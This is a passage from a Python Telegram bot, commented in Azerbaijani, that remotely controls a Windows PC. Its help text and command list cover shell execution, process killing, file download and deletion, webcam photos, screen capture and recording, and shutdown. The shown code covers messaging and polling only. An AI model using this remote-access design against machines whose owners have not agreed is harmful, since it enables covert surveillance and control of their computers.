• <code>search [söz]</code> - Fayl axtar

🌐 <b>ŞƏBƏKƏ ƏMRLƏRİ:</b>
• <code>google [axtarış]</code> - Google-da axtar
• <code>youtube [axtarış]</code> - YouTube-da axtar
• <code>ip</code> - IP ünvanını göstər
• <code>download_url [link]</code> - Fayl endir

🎮 <b>ƏYLƏNCƏ:</b>
• <code>msgbox [mətn]</code> - Mesaj pəncərəsi göstər
• <code>beep</code> - Səs çal

🛠 <b>İDARƏETMƏ:</b>
• <code>history</code> - Komanda tarixçəsi
• <code>restart</code> - Botu yenidən başlat
• <code>shutdown</code> - Kompüteri bağla
• <code>lock</code> - Kompüteri kilidlə
• <code>sleep</code> - Kompüteri yuxu rejiminə keçir

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>Versiya:</b> 4.0 ULTRA PROFESSIONAL
👑 <b>Status:</b> Active
📱 <b>İşləmə müddəti:</b> Aktiv
    """
    
    def detect_command_type(self, command: str) -> CommandType:
        """Əmr tipini müəyyən et"""
        cmd_lower = command.lower()
        
        if cmd_lower in ['ps', 'kill', 'run', 'cmd', 'sysinfo', 'restart', 'shutdown', 'lock', 'sleep']:
            return CommandType.SYSTEM
        elif cmd_lower in ['ls', 'cd', 'up', 'download', 'delete', 'mkdir', 'search']:
            return CommandType.FILE
        elif cmd_lower in ['foto', 'screen', 'screens', 'record', 'autoscreen']:
            return CommandType.MEDIA
        elif cmd_lower in ['ip', 'google', 'youtube', 'download_url']:
            return CommandType.NETWORK
        else:
            return CommandType.ADMIN if command.startswith('/') else CommandType.SYSTEM
    
    def send_message(self, chat_id: str, text: str):
        """Mesaj göndər"""
        try:
            if len(text) > 4096:
                # Uzun mesajları hissələrə böl
                for i in range(0, len(text), 4096):
                    self.bot.send_message(chat_id, text[i:i+4096], parse_mode='HTML')
            else:
                self.bot.send_message(chat_id, text, parse_mode='HTML')
        except Exception as e:
            logger.error(f"❌ Mesaj göndərmə xətası: {e}")
    
    def sanitize_filename(self, filename: str) -> str:
        """Fayl adını təmizlə"""
        return re.sub(r'[\\/*?:"<>|]', '_', filename)
    
    def format_size(self, size: int) -> str:
        """Fayl ölçüsünü formatla"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"
    
    def start(self):
        """Botu başlat"""
        self.start_time = time.time()
        logger.info("=" * 60)
        logger.info("🤖 WINDOWS BOT MANAGER - ULTRA PROFESSIONAL EDITION")
        logger.info("=" * 60)
        logger.info(f"✅ Bot işə başladı!")
        logger.info(f"📱 Process ID: {os.getpid()}")
        logger.info(f"💻 Sistem: {platform.system()} {platform.release()}")
        logger.info(f"👑 Admin ID: {self.config.admin_id}")
        logger.info(f"🤖 Bot Token: {self.config.bot_token[:10]}...")
        logger.info("=" * 60)
        logger.info("📝 Əmrlər gözlənilir...")
        logger.info("=" * 60)
        
        try:
            self.bot.polling(none_stop=True, interval=1, timeout=20)
        except KeyboardInterrupt:
            logger.info("\n🛑 Bot dayandırıldı")
        except Exception as e:
            logger.error(f"❌ Bot xətası: {e}")
            if self.config.restart_on_error:
                logger.info("🔄 5 saniyə sonra yenidən başladılır...")
                time.sleep(5)
                self.start()

# --- Main ---
if __name__ == "__main__":
    manager = BotManager()
    manager.start()